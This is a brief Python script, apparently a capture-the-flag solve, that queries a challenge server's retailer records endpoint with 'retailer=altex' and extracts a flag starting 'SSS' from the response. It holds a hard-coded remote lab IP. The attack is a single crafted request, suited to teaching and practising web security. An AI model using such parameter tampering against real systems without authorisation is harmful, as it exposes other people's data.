import requests
import sys

PORT = "7005"

def build_url(args):
    if len(args) < 2:
        sys.exit()

    if len(args) == 3:
        return f"http://{args[1]}:{args[2]}"
    if args[1] == "local":
        return f"http://127.0.0.1:{PORT}"
    if args[1] == "remote":
        return f"http://141.85.224.115:{PORT}"
    
    print("Invalid argument")
    sys.exit()

def main():
    url = build_url(sys.argv)
    endpoint = "/api-v2/retailers/records.php?retailer=altex"
    try:
        response = requests.get(url + endpoint)
        response.raise_for_status()
        flag = response.text.split("SSS")[1].split("\\")[0]
        print("SSS" + flag)
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
